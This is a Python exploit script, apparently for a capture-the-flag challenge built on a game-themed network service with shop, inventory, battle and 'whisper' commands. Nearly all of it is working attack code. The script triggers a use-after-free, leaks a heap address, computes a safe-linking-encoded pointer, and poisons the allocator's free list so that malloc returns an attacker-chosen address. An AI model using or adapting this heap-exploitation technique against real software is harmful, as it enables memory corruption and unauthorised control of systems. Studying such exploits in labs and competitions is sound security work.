#!/usr/bin/env python3
# 用已知 heap 地址 T=base+0x90 自测第二次 malloc 是否真的弹 T 并写
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
def connect(tries=60):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(4)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
def show(s):
    return cmd(s,"mw show",["Drops:"])
s,b=connect()
if s is None: print("NO BANNER"); sys.exit(1)
for i in range(5):
    cmd(s,"shop buy 1 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    cmd(s,"mw throw 0",["throws equipped item","invalid"])
    cmd(s,"mw pickup 0",["tx: item added","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd(s,"shop buy 3 34",["tx:","not enough"],3)
cmd(s,"map teleport castle",["Encounter"])
cmd(s,"battle",["player turn"])
cmd(s,"use item",["Enter inventory idx"])
cmd(s,"1",["Enter quantity"])
cmd(s,"34",["Battle won"],4)
cmd(s,"mw pickup 0",["tx: item added","invalid"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
o=show(s)
m=re.search(r"description_addr=0x([0-9a-f]+)",o)
if not m: print("NO RING"); sys.exit(1)
base=int(m.group(1),16); T=base+0x90; fd=T^(base>>12)
print("[base] 0x%x [T] 0x%x [enc(T)] 0x%x"%(base,T,fd))
# 记录改前 ring id
m=re.search(r"role=Ring #(\d+)",o); print("[id before] "+(m.group(1) if m else "?"))
cmd(s,"inv drop 1",["inventory frees","invalid"])
cmd(s,"mw whisper 0 "+struct.pack("<Q",fd).hex(),["whispered","only"],3)
o=show(s); m=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[head poison] "+(m.group(1) if m else "?")+" expect "+hex(fd))
# long whisper: payload[0:8]=enc(T)
pl=bytearray(b"A"*0x160); struct.pack_into("<Q",pl,0,fd)
o=cmd(s,"mw whisper 0 "+pl.hex(),["whispered","only","<EOF>"],4)
print("[after long] "+repr(o[-90:]))
o=show(s)
m=re.search(r"role=Ring #(\d+)",o); print("[id after] "+(m.group(1) if m else "?"))
m=re.search(r"description_head=0x([0-9a-f]+)",o); print("[head after] "+(m.group(1) if m else "?"))
s.close()
